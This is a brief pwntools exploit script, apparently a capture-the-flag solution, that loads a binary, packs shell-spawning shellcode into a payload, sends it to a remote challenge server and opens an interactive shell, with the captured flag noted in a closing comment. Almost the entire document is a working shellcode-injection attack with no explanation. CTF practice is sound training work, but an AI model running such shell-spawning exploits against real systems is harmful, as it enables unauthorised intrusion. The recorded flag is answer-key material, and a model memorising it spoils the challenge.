from pwn import *
elf = context.binary = ELF("./main")
# r = process()
r = remote("ctf-chall.stembascc.com",5227)
rop = ROP(context.binary)
rop.raw(asm(shellcraft.sh()))
print(rop.dump())
r.sendline(rop.chain())
r.interactive()

# Flag : LKS{BERHASIL_L4G11111_y333YYY}